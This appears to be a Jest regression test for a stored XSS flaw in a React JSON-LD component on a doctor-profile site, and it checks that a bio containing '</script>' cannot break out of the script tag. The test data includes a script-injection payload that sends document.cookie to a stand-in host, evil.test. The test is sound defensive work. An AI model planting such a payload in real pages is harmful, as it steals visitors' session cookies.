/**
 * XSS — stored XSS via JSON-LD structured data.
 *
 * components/seo/json-ld.tsx renders arbitrary data (including a doctor's
 * own bio/name, which the doctor fully controls via their profile) into a
 * `<script type="application/ld+json">` tag via dangerouslySetInnerHTML.
 * `JSON.stringify` alone never escapes `<`, so a bio containing a literal
 * `</script>` closes that tag early in the browser's HTML parser — anything
 * immediately after becomes a real, executing script, regardless of it
 * being "just a string" from JavaScript's point of view. This is the
 * classic JSON-in-script-tag XSS class (CWE-79), and it's exploitable by
 * any doctor account against every visitor of that doctor's public profile
 * page — no admin privileges needed to plant it, no auth needed to trigger
 * it.
 *
 * Server-rendered with react-dom/server (no jsdom needed, and no .tsx file —
 * this repo's jest testMatch is *.test.ts only) so this proves the actual
 * HTML bytes sent to a browser, not just a data-transform in isolation.
 */
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { JsonLd } from "@/components/seo/json-ld";

describe("JsonLd — script-breakout XSS", () => {
  test("a doctor bio containing a literal </script> cannot break out of the JSON-LD tag", () => {
    const maliciousBio =
      'Cardiologist.</script><script>fetch("https://evil.test/steal?c="+document.cookie)</script>';

    const html = renderToStaticMarkup(
      createElement(JsonLd, {
        data: { "@type": "Physician", name: "Dr. Test", description: maliciousBio },
      }),
    );

    // The literal byte sequence "</script>" must never appear before the
    // JSON-LD block's own closing tag — if it does, the browser's HTML
    // parser (not the JS string parser) ends the script element there.
    const firstScriptClose = html.indexOf("</script>");
    expect(firstScriptClose).toBeGreaterThan(-1);
    expect(html.indexOf("<script>fetch(")).toBe(-1);

    // The content itself must still be recoverable — this is an encoding
    // fix, not data loss/corruption.
    const jsonText = html.slice(html.indexOf(">") + 1, firstScriptClose);
    const parsed = JSON.parse(jsonText);
    expect(parsed.description).toBe(maliciousBio);
  });

  test("ordinary structured data (no attacker input) still renders correctly", () => {
    const html = renderToStaticMarkup(
      createElement(JsonLd, { data: { "@type": "Organization", name: "ZindagiCare" } }),
    );
    expect(html).toContain('"name":"ZindagiCare"');
    expect(html).toContain('type="application/ld+json"');
  });
});
